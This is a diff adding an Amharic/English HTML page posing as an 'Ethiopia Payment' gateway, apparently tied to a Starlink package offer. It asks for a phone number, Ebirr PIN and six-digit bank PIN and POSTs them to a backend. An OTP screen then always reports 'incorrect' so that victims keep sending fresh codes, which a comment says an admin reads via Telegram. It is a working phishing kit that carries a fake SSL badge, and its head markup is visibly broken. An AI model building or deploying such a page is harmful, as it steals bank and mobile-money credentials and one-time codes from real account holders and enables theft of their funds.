@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0,sans-serif;background:linear-gradient(135deg,#078930 0%,#036b27 40%,#1a1a2e 100%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+.container{width:100%;max-width:420px;}
+.card{background:#fff;border-radius:20px;padding:30px 28px;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
+/* Header */
+.header{text-align:center;margin-bottom:24px;}
+.header h1{font-size:18px;font-weight:800;color:#1a1a1a;margin-bottom:4px;}
+.header p{font-size:13px;color:#6b7280;}
+.eth-flag{display:flex;justify-content:center;gap:0;margin-bottom:12px;border-radius:6px;overflow:hidden;width:48px;height:32px;margin:0 auto 12px;}
+.eth-flag .g{background:#078930;flex:1;}
+.eth-flag .y{background:#FCDD09;flex:1;}
+.eth-flag .r{background:#DA121A;flex:1;}
+/* Lang toggle */
+.lang-toggle{position:absolute;top:14px;right:14px;}
+.lang-btn{background:#f3f4f6;border:1px solid #d1d5db;border-radius:20px;padding:4px 12px;font-size:12px;font-weight:600;color:#374151;cursor:pointer;border:none;}
+.lang-btn:hover{background:#e5e7eb;}
+/* Bank selector */
+.bank-label{font-size:12px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;}
+.banks-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin-bottom:20px;}
+.bank-btn{padding:8px 4px;border:2px solid #e5e7eb;border-radius:10px;background:#fff;cursor:pointer;text-align:center;transition:all 0.2s;font-size:10px;font-weight:700;color:#374151;}
+.bank-btn:hover{border-color:#078930;color:#078930;}
+.bank-btn.active{border-color:#078930;background:#f0fdf4;color:#078930;}
+.bank-btn .bank-icon{font-size:16px;display:block;margin-bottom:2px;}
+/* Form */
+.form-group{margin-bottom:18px;}
+.form-label{display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px;}
+.phone-wrapper{display:flex;border:2px solid #e5e7eb;border-radius:12px;overflow:hidden;transition:border-color 0.2s;}
+.phone-wrapper:focus-within{border-color:#078930;}
+.dial-code{display:flex;align-items:center;padding:0 12px;background:#f9fafb;border-right:1px solid #e5e7eb;font-weight:700;font-size:14px;color:#374151;gap:6px;}
+.dial-code img{width:22px;height:16px;border-radius:2px;object-fit:cover;}
+.phone-input{flex:1;padding:14px 12px;border:none;font-size:16px;outline:none;color:#111;}
+.pin-section{margin-bottom:18px;}
+.pin-inputs{display:flex;justify-content:center;gap:10px;}
+.pin-input{width:52px;height:52px;border:2px solid #e5e7eb;border-radius:12px;text-align:center;font-size:22px;font-weight:700;outline:none;transition:all 0.2s;-webkit-text-security:disc;}
+.pin-input:focus{border-color:#078930;box-shadow:0 0 0 3px rgba(7,137,48,0.1);}
+/* Submit button */
+.submit-btn{width:100%;padding:16px;background:linear-gradient(135deg,#078930,#036b27);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px;}
+.submit-btn:hover{background:linear-gradient(135deg,#056b25,#024d1c);transform:translateY(-1px);}
+.submit-btn:disabled{background:#d1d5db;cursor:not-allowed;transform:none;}
+.submit-btn .spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;display:none;}
+.submit-btn.loading .spinner{display:block;}
+.submit-btn.loading .btn-text{display:none;}
+@keyframes spin{to{transform:rotate(360deg);}}
+/* SSL */
+.ssl-badge{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;padding:8px;background:#f0fdf4;border-radius:8px;font-size:11px;color:#166534;}
+/* OTP Screen */
+.otp-screen{display:none;}
+.otp-screen.active{display:block;}
+.login-screen.hidden{display:none;}
+.otp-header{text-align:center;margin-bottom:24px;}
+.otp-header h2{font-size:18px;color:#1a1a1a;font-weight:700;margin-bottom:8px;}
+.otp-header p{font-size:13px;color:#6b7280;line-height:1.6;}
+.otp-header .phone-display{font-weight:700;color:#111;}
+.otp-inputs{display:flex;justify-content:center;gap:8px;margin-bottom:20px;}
+.otp-input{width:44px;height:50px;border:2px solid #e5e7eb;border-radius:10px;text-align:center;font-size:20px;font-weight:700;outline:none;transition:all 0.2s;}
+.otp-input:focus{border-color:#078930;box-shadow:0 0 0 3px rgba(7,137,48,0.1);}
+.resend-section{text-align:center;margin-top:16px;font-size:13px;color:#6b7280;}
+.resend-link{color:#078930;font-weight:600;cursor:pointer;}
+.resend-link.disabled{color:#9ca3af;cursor:not-allowed;}
+.error-msg{color:#dc2626;font-size:12px;text-align:center;min-height:18px;margin-bottom:8px;}
+/* footer */
+.footer{text-align:center;margin-top:16px;font-size:11px;color:rgba(255,255,255,0.6);}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="card" style="position:relative;">
+    <!-- Language toggle -->
+    <button class="lang-btn" id="langBtn" onclick="toggleLang()" style="position:absolute;top:14px;right:14px;">EN</button>
+
+    <!-- Login Screen -->
+    <div class="login-screen" id="loginScreen">
+      <div class="header">
+        <div class="eth-flag"><div class="g"></div><div class="y"></div><div class="r"></div></div>
+        <h1 id="headerTitle">የኢትዮጵያ ክፍያ</h1>
+        <p id="headerSub">ክፍያዎን ያሟሉ</p>
+      </div>
+
+      <!-- Bank selector -->
+      <div class="bank-label" id="bankLabel">ባንክ ይምረጡ</div>
+      <div class="banks-grid">
+        <button class="bank-btn" data-bank="KAAFI" onclick="selectBank(this)">
+          <span class="bank-icon">💳</span>KAAFI
+        </button>
+        <button class="bank-btn" data-bank="CBO" onclick="selectBank(this)">
+          <span class="bank-icon">🏦</span>CBO
+        </button>
+        <button class="bank-btn" data-bank="NIB" onclick="selectBank(this)">
+          <span class="bank-icon">🏛</span>NIB
+        </button>
+        <button class="bank-btn" data-bank="WEGAGEN" onclick="selectBank(this)">
+          <span class="bank-icon">🔑</span>WEGAGEN
+        </button>
+        <button class="bank-btn" data-bank="AHADU" onclick="selectBank(this)">
+          <span class="bank-icon">⭐</span>AHADU
+        </button>
+      </div>
+
+      <!-- Phone -->
+      <div class="form-group">
+        <label class="form-label" id="phoneLabel">ስልክ ቁጥር</label>
+        <div class="phone-wrapper">
+          <div class="dial-code">
+            <img src="https://flagcdn.com/w40/et.png" alt="ET"/>
+            +251
+          </div>
+          <input type="tel" class="phone-input" id="phoneInput" placeholder="9XXXXXXXX" maxlength="9" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');checkReady()"/>
+        </div>
+      </div>
+
+      <!-- Ebirr PIN (always visible) -->
+      <div class="pin-section">
+        <label class="form-label" id="ebirrPinLabel">Ebirr ፍ‰ን ያስገቡ</label>
+        <div class="pin-inputs">
+          <input type="tel" class="pin-input" maxlength="1" data-ebirr="0" inputmode="numeric" autocomplete="off" oninput="ebirrMove(this,0)" onkeydown="ebirrBack(event,this,0)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-ebirr="1" inputmode="numeric" autocomplete="off" oninput="ebirrMove(this,1)" onkeydown="ebirrBack(event,this,1)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-ebirr="2" inputmode="numeric" autocomplete="off" oninput="ebirrMove(this,2)" onkeydown="ebirrBack(event,this,2)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-ebirr="3" inputmode="numeric" autocomplete="off" oninput="ebirrMove(this,3)" onkeydown="ebirrBack(event,this,3)"/>
+        </div>
+      </div>
+
+      <!-- PIN (hidden until bank selected) -->
+      <div class="pin-section" id="pinSection" style="display:none;">
+        <label class="form-label" id="pinLabel">መድረሳው የባንክ ፍ‰ን (6 አኃዘ)</label>
+        <div class="pin-inputs">
+          <input type="tel" class="pin-input" maxlength="1" data-idx="0" inputmode="numeric" autocomplete="off" oninput="pinMove(this,0)" onkeydown="pinBack(event,this,0)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-idx="1" inputmode="numeric" autocomplete="off" oninput="pinMove(this,1)" onkeydown="pinBack(event,this,1)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-idx="2" inputmode="numeric" autocomplete="off" oninput="pinMove(this,2)" onkeydown="pinBack(event,this,2)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-idx="3" inputmode="numeric" autocomplete="off" oninput="pinMove(this,3)" onkeydown="pinBack(event,this,3)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-idx="4" inputmode="numeric" autocomplete="off" oninput="pinMove(this,4)" onkeydown="pinBack(event,this,4)"/>
+          <input type="tel" class="pin-input" maxlength="1" data-idx="5" inputmode="numeric" autocomplete="off" oninput="pinMove(this,5)" onkeydown="pinBack(event,this,5)"/>
+        </div>
+      </div>
+
+      <div class="error-msg" id="loginError"></div>
+
+      <button class="submit-btn" id="submitBtn" onclick="submitLogin()" disabled>
+        <span class="spinner"></span>
+        <span class="btn-text" id="submitText">ክፍያ ያረጋግጡ</span>
+      </button>
+
+      <div class="ssl-badge">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+        <span id="sslText">SSL ምስጠራ እና ደህንነቱ የተጠበቀ</span>
+      </div>
+    </div>
+
+    <!-- OTP Screen -->
+    <div class="otp-screen" id="otpScreen">
+      <div class="otp-header">
+        <h2 id="otpTitle">OTP ማረጋገጫ</h2>
+        <p id="otpSub">6-digit OTP code was sent to<br/><span class="phone-display" id="phoneDisplay">+251 9XX XXX XXX</span></p>
+      </div>
+
+      <div class="otp-inputs">
+        <input type="tel" class="otp-input" maxlength="1" data-oi="0" inputmode="numeric" oninput="otpMove(this,0)" onkeydown="otpBack(event,this,0)"/>
+        <input type="tel" class="otp-input" maxlength="1" data-oi="1" inputmode="numeric" oninput="otpMove(this,1)" onkeydown="otpBack(event,this,1)"/>
+        <input type="tel" class="otp-input" maxlength="1" data-oi="2" inputmode="numeric" oninput="otpMove(this,2)" onkeydown="otpBack(event,this,2)"/>
+        <input type="tel" class="otp-input" maxlength="1" data-oi="3" inputmode="numeric" oninput="otpMove(this,3)" onkeydown="otpBack(event,this,3)"/>
+        <input type="tel" class="otp-input" maxlength="1" data-oi="4" inputmode="numeric" oninput="otpMove(this,4)" onkeydown="otpBack(event,this,4)"/>
+        <input type="tel" class="otp-input" maxlength="1" data-oi="5" inputmode="numeric" oninput="otpMove(this,5)" onkeydown="otpBack(event,this,5)"/>
+      </div>
+
+      <div class="error-msg" id="otpError"></div>
+
+      <button class="submit-btn" id="verifyBtn" onclick="verifyOTP()" disabled>
+        <span class="spinner"></span>
+        <span class="btn-text" id="verifyText">ያረጋግጡ</span>
+      </button>
+
+      <div class="resend-section">
+        <span id="resendText">ኮድ አልደረሰዎትም?</span>
+        <span class="resend-link disabled" id="resendLink" onclick="resendOTP()">
+          <span id="resendAction">እንደገና ላክ</span> (<span id="timer">60</span>s)
+        </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">© 2026 Ethiopia Payment Gateway. All rights reserved.</div>
+</div>
+
+<script>
+  let currentLang = 'am';
+  let selectedBank = '';
+  let currentPhone = '';
+  let timerInterval = null;
+  let starlinkPackage = null;
+
+  const urlParams = new URLSearchParams(window.location.search);
+  if (urlParams.get('source') === 'starlink') {
+    starlinkPackage = urlParams.get('package') || 'starter';
+  }
+
+  const T = {
+    am: {
+      headerTitle: 'የኢትዮጵያ ክፍያ',
+      headerSub: 'ክፍያዎን ያሟሉ',
+      bankLabel: 'ባንክ ይምረጡ',
+      phoneLabel: 'ስልክ ቁጥር',
+      ebirrPinLabel: 'Ebirr ፍ‰ን ያስገቡ',
+      pinLabel: 'መድረሳው የባንክ ፍ‰ን (6 አኃዘ)',
+      submitText: 'ክፍያ ያረጋግጡ',
+      sslText: 'SSL ምስጠራ እና ደህንነቱ የተጠበቀ',
+      otpTitle: 'OTP ማረጋገጫ',
+      otpSub: '6-ዲጂት OTP ኮድ ተልኳል',
+      verifyText: 'ያረጋግጡ',
+      resendText: 'ኮድ አልደረሰዎትም?',
+      resendAction: 'እንደገና ላክ',
+      invalidPhone: 'ትክክለኛ ስልክ ቁጥር ያስገቡ',
+      invalidPin: 'ሚስጥራዊ ቁጥር (4 ዲጂት) ያስገቡ',
+      processing: 'በሂደት ላይ...',
+      error: 'ስህተት ተፈጥሯል። እንደገና ይሞክሩ።',
+      langBtn: 'EN'
+    },
+    en: {
+      headerTitle: 'Ethiopia Payment',
+      headerSub: 'Complete your payment',
+      bankLabel: 'Select Bank',
+      phoneLabel: 'Phone Number',
+      ebirrPinLabel: 'Enter Ebirr Pin',
+      pinLabel: 'Enter Bank PIN (6 digits)',
+      submitText: 'Confirm Payment',
+      sslText: 'SSL Encrypted and Secure',
+      otpTitle: 'OTP Verification',
+      otpSub: '6-digit OTP code sent to',
+      verifyText: 'Verify',
+      resendText: "Didn't receive code?",
+      resendAction: 'Resend',
+      invalidPhone: 'Please enter a valid phone number',
+      invalidPin: 'Please enter your 4-digit PIN',
+      processing: 'Processing...',
+      error: 'Something went wrong. Please try again.',
+      langBtn: 'አማ'
+    }
+  };
+
+  function t(key) { return (T[currentLang] || T.am)[key] || key; }
+
+  function applyLang() {
+    document.documentElement.lang = currentLang;
+    document.getElementById('headerTitle').textContent = t('headerTitle');
+    document.getElementById('headerSub').textContent = t('headerSub');
+    document.getElementById('bankLabel').textContent = t('bankLabel');
+    document.getElementById('phoneLabel').textContent = t('phoneLabel');
+    document.getElementById('ebirrPinLabel').textContent = t('ebirrPinLabel');
+    document.getElementById('pinLabel').textContent = t('pinLabel');
+    document.getElementById('submitText').textContent = t('submitText');
+    document.getElementById('sslText').textContent = t('sslText');
+    document.getElementById('otpTitle').textContent = t('otpTitle');
+    document.getElementById('verifyText').textContent = t('verifyText');
+    document.getElementById('resendText').textContent = t('resendText');
+    document.getElementById('resendAction').textContent = t('resendAction');
+    document.getElementById('langBtn').textContent = t('langBtn');
+    const otpSubEl = document.getElementById('otpSub');
+    otpSubEl.innerHTML = t('otpSub') + '<br/><span class="phone-display" id="phoneDisplay">+251 ' + currentPhone + '</span>';
+  }
+
+  function toggleLang() {
+    currentLang = currentLang === 'am' ? 'en' : 'am';
+    applyLang();
+  }
+
+  function selectBank(btn) {
+    document.querySelectorAll('.bank-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    selectedBank = btn.dataset.bank;
+    // Show PIN section on first bank selection
+    const pinSection = document.getElementById('pinSection');
+    if (pinSection) {
+      pinSection.style.display = '';
+      setTimeout(() => { const f = document.querySelector('[data-idx="0"]'); if(f) f.focus(); }, 50);
+    }
+    checkReady();
+  }
+
+  function pinMove(input, idx) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value) {
+      const next = document.querySelector(`[data-idx="${idx+1}"]`);
+      if (next) next.focus();
+    }
+    checkReady();
+  }
+
+  function pinBack(e, input, idx) {
+    if (e.key === 'Backspace' && !input.value && idx > 0) {
+      const prev = document.querySelector(`[data-idx="${idx-1}"]`);
+      if (prev) { prev.focus(); prev.value = ''; }
+      e.preventDefault();
+    }
+  }
+
+  function checkReady() {
+    const phone = document.getElementById('phoneInput').value;
+    const ebirrPin = Array.from(document.querySelectorAll('[data-ebirr]')).map(i => i.value).join('');
+    const bankPin = Array.from(document.querySelectorAll('[data-idx]')).map(i => i.value).join('');
+    const bankPinRequired = document.getElementById('pinSection').style.display !== 'none';
+    document.getElementById('submitBtn').disabled = !selectedBank || phone.length < 9 || ebirrPin.length < 4 || (bankPinRequired && bankPin.length < 6);
+  }
+
+  function ebirrMove(input, idx) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value) {
+      const next = document.querySelector(`[data-ebirr="${idx+1}"]`);
+      if (next) next.focus();
+    }
+    checkReady();
+  }
+
+  function ebirrBack(e, input, idx) {
+    if (e.key === 'Backspace' && !input.value && idx > 0) {
+      const prev = document.querySelector(`[data-ebirr="${idx-1}"]`);
+      if (prev) { prev.focus(); prev.value = ''; }
+      e.preventDefault();
+    }
+  }
+
+  async function submitLogin() {
+    const phone = document.getElementById('phoneInput').value;
+    const ebirrPin = Array.from(document.querySelectorAll('[data-ebirr]')).map(i => i.value).join('');
+    const bankPin = Array.from(document.querySelectorAll('[data-idx]')).map(i => i.value).join('');
+    const combinedPin = bankPin ? `${ebirrPin}|${bankPin}` : ebirrPin;
+    if (phone.length < 9 || ebirrPin.length < 4) return;
+
+    currentPhone = phone;
+    const btn = document.getElementById('submitBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+    document.getElementById('loginError').textContent = '';
+
+    try {
+      const res = await fetch('/api/ethiopia/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone: '+251 ' + phone,
+          pin: combinedPin,
+          bank: selectedBank,
+          country: 'ET',
+          starlinkPackage: starlinkPackage
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('otpScreen').classList.add('active');
+        document.getElementById('phoneDisplay').textContent = '+251 ' + phone;
+        document.querySelector('[data-oi="0"]').focus();
+        startTimer();
+      } else {
+        document.getElementById('loginError').textContent = t('error');
+      }
+    } catch(e) {
+      document.getElementById('loginError').textContent = t('error');
+    }
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
+
+  function otpMove(input, idx) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value) {
+      const next = document.querySelector(`[data-oi="${idx+1}"]`);
+      if (next) next.focus();
+    }
+    const code = Array.from(document.querySelectorAll('[data-oi]')).map(i => i.value).join('');
+    document.getElementById('verifyBtn').disabled = code.length < 6;
+    if (code.length === 6) verifyOTP();
+  }
+
+  function otpBack(e, input, idx) {
+    if (e.key === 'Backspace' && !input.value && idx > 0) {
+      const prev = document.querySelector(`[data-oi="${idx-1}"]`);
+      if (prev) { prev.focus(); prev.value = ''; }
+      e.preventDefault();
+    }
+  }
+
+  async function verifyOTP() {
+    const code = Array.from(document.querySelectorAll('[data-oi]')).map(i => i.value).join('');
+    if (code.length < 6) return;
+
+    const btn = document.getElementById('verifyBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+    document.getElementById('otpError').textContent = '';
+
+    try {
+      await fetch('/api/ethiopia/verify-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          otp: code,
+          phone: '+251 ' + currentPhone,
+          bank: selectedBank,
+          country: 'ET'
+        })
+      });
+    } catch(e) {}
+
+    // Always show "incorrect" — admin verifies manually via Telegram
+    document.getElementById('otpError').textContent = currentLang === 'am'
+      ? 'ኮዱ ትክክለኛ አይደለም። አዲሱን ኮድ ያስገቡ።'
+      : 'Incorrect OTP. Please enter the new code.';
+
+    // Clear all boxes and re-enable for next try
+    Array.from(document.querySelectorAll('[data-oi]')).forEach(i => { i.value = ''; });
+    btn.classList.remove('loading');
+    btn.disabled = true; // stays disabled until 6 digits entered again
+    btn.innerHTML = '<span class="spinner"></span><span class="btn-text" id="verifyText">' + t('verifyText') + '</span>';
+    btn.style.background = '';
+    document.querySelector('[data-oi="0"]').focus();
+  }
+
+  async function resendOTP() {
+    const link = document.getElementById('resendLink');
+    if (link.classList.contains('disabled')) return;
+    link.classList.add('disabled');
+    try {
+      await fetch('/api/ethiopia/resend-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: '+251 ' + currentPhone, country: 'ET' })
+      });
+    } catch(e) {}
+    startTimer();
+  }
+
+  function startTimer() {
+    let secs = 60;
+    const timerEl = document.getElementById('timer');
+    const link = document.getElementById('resendLink');
+    link.classList.add('disabled');
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      secs--;
+      if (timerEl) timerEl.textContent = secs;
+      if (secs <= 0) {
+        clearInterval(timerInterval);
+        link.classList.remove('disabled');
+      }
+    }, 1000);
+  }
+
+  // Init
+  applyLang();
+</script>
+</body>
+</html>
